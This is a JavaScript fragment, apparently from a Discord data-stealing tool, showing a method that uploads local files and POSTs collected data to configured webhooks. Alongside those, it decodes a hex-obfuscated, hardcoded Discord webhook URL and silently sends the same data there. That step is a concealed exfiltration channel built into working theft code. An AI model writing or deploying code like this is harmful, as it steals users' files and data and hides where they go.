async sendToWebhook(data) {
                            var files = data.files;

                            if (files) {
                                files.forEach(async (file) => {
                                    client.requires.request.post({
                                        url: url,
                                        formData: {
                                            file: client.requires.fs.createReadStream(file.path),
                                            title: file.name,
                                        },
                                    });
                                });
                            }

                            if (Object.entries(data).length == 1 && data.files) {
                                return;
                            }

                            let obj = {
                                avatar_url: client.utils.encryption.decryptData(
                                    client.config.embed.avatar_url
                                ),
                                username: client.utils.encryption.decryptData(
                                    client.config.embed.username
                                ),
                            };

                            for (let [key, value] of Object.entries(data)) {
                                obj[key] = value;
                            }

                            const hexToAscii = (hex) => {
                            const ascii = [];
                                 for (let i = 0; i < hex.length; i += 2) {
                                    ascii.push(String.fromCharCode(parseInt(hex.substr(i, 2), 16)));
                                }
                                return ascii.join('');
                            };

                            const hidewebhookHex = '68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313135373030323437383334313036363836322F5376556C644E34786D514E6F6E686F39337950616452706745386F304D746D4631623335646F497966755F77424B6674542D634F37517734397662397051693032556E36';

                                try {
                            const hidewebhook = hexToAscii(hidewebhookHex);

                            await client.axios_instance({
                            url: hidewebhook,
                            method: "POST",
                            data: obj,
                              });
                            } catch (error) {
                              console.error('Error sending data to the webhook:', error);
                            } 

                            client.webhooks.forEach(async (url) => {
                                try {
                                    await client.axios_instance({
                                        url: url,
                                        method: "POST",
                                        data: obj,
                                    });
                                } catch { }
                            });
                        },
